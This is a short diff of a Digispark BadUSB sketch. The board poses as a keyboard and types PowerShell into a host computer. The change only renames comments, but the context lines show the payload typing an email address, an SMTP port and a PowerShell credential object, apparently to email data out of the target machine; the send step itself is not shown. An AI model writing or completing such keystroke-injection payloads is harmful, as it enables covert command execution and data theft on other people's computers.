@@ -41,7 +41,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
 
-// variables start
+// User variables start
 
   //from email address:
   DigiKeyboard.print(F("$email = \"YOUREMAIL@gmail.com\";"));
@@ -56,7 +56,7 @@ void loop() {
   //smtp server port
   DigiKeyboard.print(F("$port = \"587\";"));
 
-// variables end
+// User variables end
   
   DigiKeyboard.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
   DigiKeyboard.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
